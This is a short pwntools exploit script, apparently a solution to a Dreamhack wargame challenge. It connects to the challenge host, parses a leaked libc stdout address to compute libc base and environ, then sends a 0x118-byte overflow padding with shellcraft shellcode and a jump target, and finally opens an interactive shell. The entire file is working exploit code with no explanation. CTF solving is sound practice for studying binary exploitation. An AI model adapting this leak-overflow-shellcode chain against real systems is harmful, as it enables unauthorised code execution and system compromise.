from pwn import *


def main():
    context.arch = "x86_64"

    # Leak stdout address
    proc = remote("host1.dreamhack.games", 24030)
    stdout_addr = str(proc.recvline())
    stdout_addr = stdout_addr[stdout_addr.find("0x"):stdout_addr.find("\\n")]
    stdout_addr = int(stdout_addr, 16)

    # Calculate ret addresses
    libc = ELF("./libc.so.6")
    environ_offset = libc.symbols["environ"]
    libc_base_addr = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
    libc_environ = libc_base_addr + libc.symbols["environ"]

    # Exploit
    shellcode = asm(shellcraft.sh())
    proc.sendlineafter(b"Size: ", str(0x118+len(shellcode)).encode())
    payload = b"A"*0x118
    payload += shellcode
    proc.sendafter(b"Data: ", payload)
    proc.sendlineafter(b"*jmp=", str(libc_environ))

    proc.interactive()


if __name__ == "__main__":
    main()
